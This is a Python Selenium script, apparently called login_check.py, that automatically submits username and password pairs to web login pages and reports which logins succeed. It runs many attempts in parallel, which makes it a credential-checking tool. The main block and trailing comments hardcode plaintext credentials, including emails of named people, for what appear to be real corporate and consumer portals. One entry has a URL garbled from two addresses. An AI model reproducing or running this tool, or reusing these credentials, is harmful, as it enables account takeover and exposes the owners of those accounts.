import sys
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException, StaleElementReferenceException

import asyncio
from concurrent.futures import ThreadPoolExecutor

def find_element(driver, wait, locator_options):
    """
    Try multiple locator options until one works.
    locator_options: list of (By, value) tuples
    """
    for by, value in locator_options:
        try:
            return wait.until(EC.presence_of_element_located((by, value)))
        except Exception:
            continue
    raise NoSuchElementException(f"None of the selectors worked: {locator_options}")

def find_button(driver, wait, locator_options):
    """
    Try multiple locator options until one works.
    locator_options: list of (By, value) tuples
    """
    for by, value in locator_options:
        try:
            return wait.until(EC.element_to_be_clickable((by, value)))
        except Exception:
            continue
    raise NoSuchElementException(f"None of the selectors worked: {locator_options}")

def _button_missing(button):
    try:
        # If button is detached from DOM, Selenium throws StaleElementReferenceException
        button.is_displayed()
        return False
    except StaleElementReferenceException:
        return True
    except Exception:
        return False

def try_login(domain, username, password):
    print(f"[INFO] Opening {domain} ...")

    options = Options()
    # 🚫 Not headless → will open real browser window
    # options.add_argument("--headless")  

    driver = webdriver.Chrome(service=Service(), options=options)

    try:
        driver.set_page_load_timeout(15)
        driver.get(domain)

        wait = WebDriverWait(driver, 10)

        # === Possible selectors for username/email ===
        username_locators = [
            (By.NAME, "username"),
            (By.NAME, "email"),
            (By.ID, "username"),
            (By.ID, "email"),
            (By.CSS_SELECTOR, "input[type='email']"),
            (By.CSS_SELECTOR, "input[type='text']")
        ]

        # === Possible selectors for password ===
        password_locators = [
            (By.NAME, "password"),
            (By.ID, "password"),
            (By.CSS_SELECTOR, "input[type='password']")
        ]

        # === Possible selectors for login button ===
        button_locators = [
            (By.NAME, "login"),
            (By.ID, "login"),
            (By.ID, "submit"),
            (By.CSS_SELECTOR, "button[type='submit']"),
            (By.CSS_SELECTOR, "input[type='submit']")
        ]

        print("[INFO] Looking for username field...")
        user_input = find_element(driver, wait, username_locators)

        print("[INFO] Entering username...")
        user_input.clear()
        user_input.send_keys(username)
        user_input.send_keys(Keys.ENTER)

        try:
            print("[INFO] Looking for password field...")
            pass_input = find_element(driver, wait, password_locators)

            print("[INFO] Entering password...")
            pass_input.clear()
            pass_input.send_keys(password)
            # pass_input.send_keys(Keys.ENTER)
        except NoSuchElementException:
            print("[INFO] No password field found, assuming password field is not required insted required otp.")
            return "Unable to verify password. as required otp."

        # Try to click login button (fallback: press Enter)
        try:
            print("[INFO] Looking for login button...")
            login_button = find_button(driver, wait, button_locators)
            print("[INFO] Clicking login button...")
            login_button.click()
            # login_button = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']")))
            # print("[INFO] Clicking login button...")
            # login_button.click()
        except Exception:
            print("[INFO] No login button found, pressing Enter instead...")
            pass_input.send_keys(Keys.RETURN)

        print("[INFO] Waiting for response...")
        wait.until(
            lambda d: (
                "captcha" in d.page_source.lower()
                or _button_missing(login_button)
                or "logout" in d.page_source.lower()
                or "dashboard" in d.page_source.lower()
                or "invalid" in d.page_source.lower()
                or "error" in d.page_source.lower()
                or "success" in d.page_source.lower()
                or "congratulations" in d.page_source.lower()
                or len(d.find_elements(By.CLASS_NAME, "toast")) > 0
                or len(d.find_elements(By.CSS_SELECTOR, "[class*='alert-success']")) > 0
                or len(d.find_elements(By.CLASS_NAME, "swal2-popup")) > 0
            ),
            "Timeout while waiting for login result"
        )

        page_source = driver.page_source.lower()

        # ✅ Success check comes FIRST
        if driver.find_elements(By.CSS_SELECTOR, "[class*='alert-success']") \
            or driver.find_elements(By.CLASS_NAME, "toast") \
            or driver.find_elements(By.CLASS_NAME, "swal2-popup") \
            or "dashboard" in page_source \
            or "logout" in page_source \
            or "welcome" in page_source:
            print("✅ Login successful!")
            return "Login successful!"   

        elif "captcha" in page_source:
            print("⚠️ Captcha detected.")
            return "Unable to verify. as captcha detected."

        # ✅ Restrict error check to avoid CSS false-positives
        elif driver.find_elements(By.CSS_SELECTOR, "[class*='alert-danger']") \
            or driver.find_elements(By.CSS_SELECTOR, "[class*='error']") \
            or "invalid" in page_source \
            or "wrong password" in page_source \
            or "authentication failed" in page_source:
            print("❌ Login failed.")
            return "Login failed."

        else:
            print("⚠️ Unable to determine login status.")
            return("Unable to verify unable to determine login status.")

    except TimeoutException:
        print("⚠️ Timeout: page took too long or login result not detected.")
        return "Unable to verify timeout."
    except NoSuchElementException as e:
        print(f"❌ Could not find login fields: {e}")
        return "Unable to verify could not find login fields."
    except Exception as e:
        print(f"⚠️ Unexpected error: {e}")
        return "Unable to verify unexpected error."
    finally:
        input("[INFO] Press Enter to close browser...")  # keep window open for debugging
        driver.quit()
        print("[INFO] Browser closed.")


async def run_logins(credentials):
    results = []

    # ThreadPoolExecutor for parallel selenium runs
    with ThreadPoolExecutor(max_workers=len(credentials)) as executor:
        loop = asyncio.get_running_loop()
        tasks = [
            loop.run_in_executor(executor, try_login, domain, username, password)
            for domain, username, password in credentials
        ]
        for coro in asyncio.as_completed(tasks):
            result = await coro
            results.append(result)

    return results

if __name__ == "__main__":
    if len(sys.argv) == 4:
        domain, username, password = sys.argv[1], sys.argv[2], sys.argv[3]
        print(try_login(domain, username, password))
    elif len(sys.argv) == 1:
        credentials = [
            ("https://mdweb.ab-inbev.com:9443/login", "10417758726", "Corpa-2020"),
            ("https://the-internet.herokuapp.com/login", "tomsmith", "SuperSecretPassword!"),
            ("globalsso.ab-inbev.com/adfhttp://versioncontrol.vertoz.com/users/sign_ins/ls", "dvillaci@gmodelo.com.mx", "Segur0.20#"),
            ("https://tippspiel.tippevent.de", "olga.gracheva@ab-inbev.com", "5496282")
            ]
        results = asyncio.run(run_logins(credentials))
        print("\n=== Results ===")
        for r in results:
            print(r)
    else:
        print("Usage: python login_check.py <domain> <username> <password>")
        sys.exit(1)



# python login_check.py "https://betapanel.darkdive.io/login" "omkar.kalantre+testing1@vertoz.com" "Pass@123"
# python login_check.py "http://versioncontrol.vertoz.com/users/sign_in" "omkar.kalantre@vertoz.com" "Pass@123"
# python login_check.py "https://www.airmiles.ca/en/login.html" "89007287092" "2996"
# python login_check.py "https://mdweb.ab-inbev.com:9443/login" "ventas@ferrelabufa.com" "Fbu2016.!"


# python login_check.py "https://mdweb.ab-inbev.com:9443/login" "10417758726" "Corpa-2020"
# python login_check.py "https://the-internet.herokuapp.com/login" "tomsmith" "SuperSecretPassword!"

